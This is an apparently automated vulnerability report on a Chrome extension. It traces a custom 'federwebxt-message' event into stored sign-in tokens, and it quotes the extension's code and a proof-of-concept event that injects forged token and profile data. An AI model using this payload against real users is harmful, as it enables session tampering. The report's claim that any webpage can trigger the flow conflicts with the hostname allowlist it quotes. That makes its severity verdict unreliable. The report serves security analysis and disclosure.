# CoCo Analysis: gioninhnkghmdcnjbomehheggepodhfk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple instances of cs_window_eventListener_federwebxt-message → chrome_storage_sync_set_sink

---

## Sink: cs_window_eventListener_federwebxt-message → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gioninhnkghmdcnjbomehheggepodhfk/opgen_generated_files/cs_0.js
Line 467: Content script listening to custom "federwebxt-message" event
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gioninhnkghmdcnjbomehheggepodhfk/opgen_generated_files/bg.js
Line 965: Background script storing payload fields to chrome.storage.sync

**Analysis:**

CoCo detected a flow from a custom window event listener to chrome.storage.sync.set. The content script listens for custom DOM events and forwards the data to the background script, which stores multiple fields from the attacker-controlled payload.

**Code:**

```javascript
// Content script (cs_0.js Line 467)
window.addEventListener("federwebxt-message", function(e) { // ← attacker can dispatch
  console.debug("[contentBridge] [federwebxt-message] sending message to chrome background", e);
  const t = n => {
    console.debug("[contentBridge] [federwebxt-message] received response from chrome background", n),
    n && n.type === "FEDERAI_SIGNIN_SUCCESS" &&
      window.dispatchEvent(new CustomEvent(n.type, {detail: n}))
  };
  const o = n => {
    console.error("[contentBridge] [federwebxt-message] error sending message to chrome background", n)
  };
  chrome.runtime.sendMessage(e.detail).then(t, o) // ← forwards attacker-controlled e.detail
}, !1);

// Background script (bg.js Line 965)
const h = e => {
  const a = new URL(e);
  return ["localhost", "federai-landing.vercel.app", "federai.vercel.app",
          "federai.co", "www.federai.co"].includes(a.hostname)
};

chrome.runtime.onMessage.addListener((e, a, t) => {
  if (console.debug("background received message", e, a, t),
      e && e.type === "SIGNIN" && e.payload && h(a.origin)) // ← origin check
    return chrome.storage.sync.set({
      id: e.payload.id, // ← attacker-controlled
      token: e.payload.token, // ← attacker-controlled
      expiresIn: e.payload.expiresIn, // ← attacker-controlled
      name: e.payload.name, // ← attacker-controlled
      username: e.payload.username, // ← attacker-controlled
      twitterProfileImageUrl: e.payload.twitterProfileImageUrl // ← attacker-controlled
    }).then(() => {
      console.debug("Background [SIGNIN] Saved to chrome storage"),
      t({type: "FEDERAI_SIGNIN_SUCCESS"})
    }), !0;
  // ... rest of message handling
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Custom DOM event (window.dispatchEvent)

**Attack:**

```javascript
// Malicious webpage dispatches custom event
// Content script runs on <all_urls> per manifest.json
window.dispatchEvent(new CustomEvent("federwebxt-message", {
  detail: {
    type: "SIGNIN",
    payload: {
      id: "malicious-id",
      token: "attacker-stolen-or-fake-token",
      expiresIn: "9999999999",
      name: "Attacker Name",
      username: "attacker",
      twitterProfileImageUrl: "https://attacker.com/malicious.jpg"
    }
  }
}));
```

**Impact:** Complete account/authentication takeover vulnerability. An attacker on any webpage can inject arbitrary authentication data into the extension's sync storage by dispatching the custom "federwebxt-message" event. The content script blindly forwards this data to the background script, which stores it after only checking the sender's origin (which for content script messages is the webpage origin). While there's an origin check using h(a.origin), this check verifies if the message came from a federai.co domain - but since the content script runs on <all_urls>, ANY webpage can trigger this flow. The attacker can inject malicious token values, user IDs, profile URLs, etc., potentially hijacking the user's FederAI session or causing the extension to authenticate as the attacker.
